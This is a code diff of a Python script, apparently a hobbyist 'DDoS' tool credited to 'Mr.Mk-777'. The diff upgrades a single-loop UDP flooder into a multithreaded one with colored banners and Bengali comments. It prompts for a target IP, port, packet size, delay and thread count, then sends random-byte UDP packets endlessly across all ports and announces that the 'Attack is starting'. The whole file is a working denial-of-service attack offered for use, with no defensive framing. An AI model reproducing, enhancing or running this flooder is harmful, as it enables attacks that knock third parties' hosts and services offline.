@@ -1,56 +1,94 @@
-print("\033[91m")
-import sys
 import os
 import time
 import socket
 import random
-from datetime import datetime
+import threading
 
-# Code Time
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+# র‍্যান্ডম কালার লিস্ট
+colors = ["\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m", "\033[96m"]
 
-##############
+# ASCII ব্যানার (figlet ছাড়া)
+ascii_banner = r"""
+ __  __ _     ____    ____   ___   ____  
+|  \/  (_)___|  _ \  |  _ \ / _ \ / ___| 
+| |\/| | / __| | | | | | | | | | | |     
+| |  | | \__ \ |_| | | |_| | |_| | |___  
+|_|  |_|_|___/____/  |____/ \___/ \____| 
+"""
+
+# ব্যানার দেখানোর ফাংশন
+def show_banner(text):
+    os.system("clear")
+    for line in text.splitlines():
+        color = random.choice(colors)
+        print(color + line)
+        time.sleep(0.1)
+    print("\033[0m")  # reset
+
+# ইনফো এনিমেটেডভাবে দেখানোর ফাংশন
+def show_info(info_lines):
+    for line in info_lines:
+        color = random.choice(colors)
+        print(color + line)
+        time.sleep(0.2)
+    print("\033[0m")
+
+# ইনপুট নেওয়া
+show_banner(ascii_banner)
+info = [
+    "Coded By : Mr.Mk-777",
+    "Author   : Mkmuslim777",
+    "Github   : github.com/Mkmuslim777",
+    "FB       : facebook.com/MuslimUddinMk",
+    "Telegram : t.me/MK777team"
+]
+show_info(info)
+
+# ইনপুট
+ip = input("IP Target           : ")
+port = int(input("Starting Port       : "))
+packet_size = int(input("Packet Size (bytes) : "))
+delay = float(input("Delay (seconds)     : "))
+threads = int(input("Number of Threads   : "))
+
+# Packet data
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes_ = random._urandom(1490)
-#############
-
-os.system("clear")
-os.system("figlet Mk-DdS")
-print()
-print("Coded By : Mr.Mk-777")
-print("Author   : Mkmuslim777")
-print("Github   : github.com/Mkmuslim777")
-print("FB       : https://www.facebook.com/MuslimUddinMk")
-print("Telegram : https://t.me/MK777team")
-print()
-
-ip = input("IP Target : ")
-port = int(input("Port      : "))
-
-os.system("clear")
-print("\033[93m")
-os.system("figlet Mk777")
-print("Team : Mk-777")
-print("\033[92m")
-print("[                    ] 0% ")
-print("[=====               ] 25%")
-print("[==========          ] 50%")
-time.sleep(1)
-print("[===============     ] 75%")
-time.sleep(1)
-print("[====================] 100%")
-time.sleep(1)
-
+bytes_ = random._urandom(packet_size)
 sent = 0
+start_time = time.time()
+lock = threading.Lock()
+
+# প্যাকেট পাঠানোর ফাংশন
+def send_packets():
+    global sent, port
+    while True:
+        sock.sendto(bytes_, (ip, port))
+        with lock:
+            sent += 1
+            port += 1
+            if port >= 65534:
+                port = 1
+            current_time = time.strftime("%H:%M:%S")
+            print(f"\033[96m[{current_time}] Sent {sent} packet to {ip} through port: {port}")
+        time.sleep(delay)
+
+# আক্রমণ শুরু ব্যানার
+attack_banner = r"""
+ __  __ _  __     __
+|  \/  (_)/ _|___/ _|
+| |\/| | | |_/ __| |_
+| |  | | |  _\__ \  _|
+|_|  |_|_|_| |___/_| 
+"""
+show_banner(attack_banner)
+print(random.choice(colors) + "Attack is starting...\n")
+
+# একাধিক থ্রেড চালু করা
+for _ in range(threads):
+    thread = threading.Thread(target=send_packets)
+    thread.daemon = True
+    thread.start()
+
+# প্রোগ্রাম চালু রাখার জন্য
 while True:
-    sock.sendto(bytes_, (ip, port))
-    sent += 1
-    port += 1
-    print(f"Sent {sent} packet to {ip} through port: {port}")
-    if port == 65534:
-        port = 1
+    time.sleep(1)
